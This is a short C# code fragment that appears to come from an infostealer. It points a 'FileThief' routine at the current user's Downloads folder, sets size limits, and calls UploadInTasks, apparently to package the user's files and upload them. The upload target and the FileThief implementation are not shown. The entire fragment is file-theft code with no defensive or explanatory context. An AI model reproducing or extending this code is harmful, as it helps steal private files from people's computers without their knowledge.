string LogPath = "C:/Users/" + Environment.UserName + "/Downloads/Log/";
string FolderPath = "C:/Users/" + Environment.UserName + "/Downloads/Files/";
int maxArchiveSize = 300;
int maxFileSize = 10000000;

FileThief.UploadInTasks(LogPath, FolderPath, maxFileSize, maxArchiveSize);